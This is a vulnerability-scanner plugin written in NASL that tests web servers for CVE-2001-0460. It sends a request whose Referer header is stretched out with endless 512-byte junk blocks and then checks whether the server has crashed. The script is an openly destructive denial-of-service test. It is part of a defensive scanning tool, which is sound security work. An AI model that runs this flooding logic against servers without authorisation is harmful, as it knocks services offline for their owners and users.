if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11084" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 2465 );
	script_cve_id( "CVE-2001-0460" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Infinite HTTP request" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "www/vnc", "+WN/banner", "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software or protect it with a filtering reverse proxy." );
	script_tag( name: "summary", value: "It was possible to kill the web server by
  sending an invalid 'infinite' HTTP request that never ends." );
	script_tag( name: "impact", value: "An attacker may exploit this vulnerability to make your web server
  crash continually or even execute arbirtray code on your system." );
	script_tag( name: "affected", value: "WebSweeper 4.0 for Windows NT. Other versions or products might be
  affected as well." );
	script_tag( name: "qod_type", value: "remote_banner_unreliable" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(egrep( pattern: "Server: +WN/2\\.4\\.", string: banner )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
crap512 = crap( 512 );
r = http_get( item: "/", port: port );
r = r - "\r\n\r\n";
r = strcat( r, "\r\nReferer: ", crap512 );
send( socket: soc, data: r );
cnt = 0;
for(;send( socket: soc, data: crap512 ) > 0;){
	cnt = cnt + 512;
	if(cnt > 524288){
		r = recv( socket: soc, length: 13, timeout: 2 );
		http_close_socket( soc );
		if(r){
			exit( 0 );
		}
		if(http_is_dead( port: port )){
			security_message( port );
			exit( 0 );
		}
		exit( 99 );
	}
}
if(http_is_dead( port: port )){
	security_message( port );
}
http_close_socket( soc );

